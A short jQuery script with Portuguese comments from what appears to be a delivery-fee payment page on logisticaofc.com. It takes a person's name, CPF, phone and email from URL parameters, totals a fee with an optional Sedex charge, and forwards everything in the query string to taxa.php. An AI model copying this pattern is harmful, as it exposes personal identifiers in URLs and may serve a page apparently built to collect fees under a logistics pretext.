<script>
  $(document).ready(function () {

      // Função para obter os parâmetros da URL
    function getURLParameter(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

      // Função para formatar o CPF (XXX.XXX.XXX-XX)
    function formatCPF(cpf) {
        return cpf.replace(/\D/g, '') // Remove caracteres não numéricos
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      }

      // Captura os valores dos parâmetros da URL
      const nome = getURLParameter('nome');
      const cpf = getURLParameter('cpf');
      const telefone = getURLParameter('telefone');
      const email = getURLParameter('email');

      if (!cpf) {
        let currentUrl = window.location.href;
        let newUrl = currentUrl.substring(0, currentUrl.lastIndexOf('https://logisticaofc.com/'))
        window.location.href = newUrl;
      }

      // Preenche os campos com os valores capturados
      if (nome) $('#nome').text(nome);
      if (cpf) $('#cpf').text(formatCPF(cpf)); // Formata o CPF antes de exibir



      $('#pegar-oferta-checkbox').change(function () {
        let taxa = parseFloat($('#taxa').text().replace('R$', '').replace(',', '.').trim());
        let sedex = parseFloat($('#sedex').text().replace('R$', '').replace(',', '.').trim());
        let valorFinal;

        if ($(this).is(':checked')) {
          valorFinal = taxa + sedex;
          console.log(valorFinal.toFixed(2).replace('.','')); 
          $('#valorTotal').val(valorFinal.toFixed(2).replace('.',''));
        } else {
          valorFinal = taxa;
          console.log(valorFinal.toFixed(2).replace('.',''));
          $('#valorTotal').val(valorFinal.toFixed(2).replace('.',''));
        }        

      });

      function valorTaxaPadrao() {
        let taxa = parseFloat($('#taxa').text().replace('R$', '').replace(',', '.').trim());
        
        valorFinal = taxa;
        console.log(valorFinal.toFixed(2).replace('.',''));
        $('#valorTotal').val(valorFinal.toFixed(2).replace('.',''));      
      }

      valorTaxaPadrao();

      $('#gerar-pagamento').click(function (e) {
        e.preventDefault();

        let currentUrl = window.location.href;
        
        let cpf = $('#cpf').text();
        let nome = $('#nome').text();
        let valorTotal =  $('#valorTotal').val();

        let newUrl =
        currentUrl.substring(0, currentUrl.lastIndexOf('https://logisticaofc.com/')) +
        '/taxa.php?telefone=' +
        encodeURIComponent(telefone) +
        '&cpf=' + encodeURIComponent(cpf) +
        '&nome=' + encodeURIComponent(nome) +
        '&email=' +encodeURIComponent(email) +
        '&valor=' + valorTotal +
        '&cod=' + getURLParameter('cod')
        

        // Redirecionar para o novo URL
        window.location.href = newUrl;
      });

    });
  </script>
